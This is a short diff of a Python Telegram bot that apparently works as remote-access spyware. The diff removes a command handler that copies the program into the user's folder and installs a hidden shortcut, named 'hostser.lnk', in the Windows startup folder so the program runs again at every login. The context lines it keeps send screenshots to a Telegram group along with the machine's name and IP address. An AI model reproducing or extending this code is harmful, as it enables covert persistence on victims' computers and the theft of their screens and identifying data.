@@ -1,29 +1,5 @@
 code_to_execute = ''
-@bot.message_handler(commands=['avto'])
-def avto(message):
-    try:
-        current_program = os.path.abspath(__file__)
-        user_folder = os.path.expanduser("~")
-        copy_folder = os.path.join(user_folder, "MyProgram")
-        os.makedirs(copy_folder, exist_ok=True)
-        shutil.copy(current_program, copy_folder)
-        
-        shortcut_name = "hostser.lnk"
-        shortcut_path = os.path.join(user_folder, shortcut_name)
-        
-        with winshell.shortcut(shortcut_path) as shortcut:
-            shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
-            shortcut.show_cmd = win32con.SW_HIDE  # Скрываем ярлык
-            shortcut.icon = (None, 0)  # Задаем значение None для иконки
-        
-        startup_folder = winshell.startup()
-        startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
-        shutil.copy(shortcut_path, startup_shortcut_path)
-        
-        bot.send_message(message.chat.id, "Успешно добавлен ярлык в автозапуск!")
-    
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Произошла ошибка при добавлении ярлыка в автозапуск: {e}")
+
 def send_message_to_group(chat_id, screenshot):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
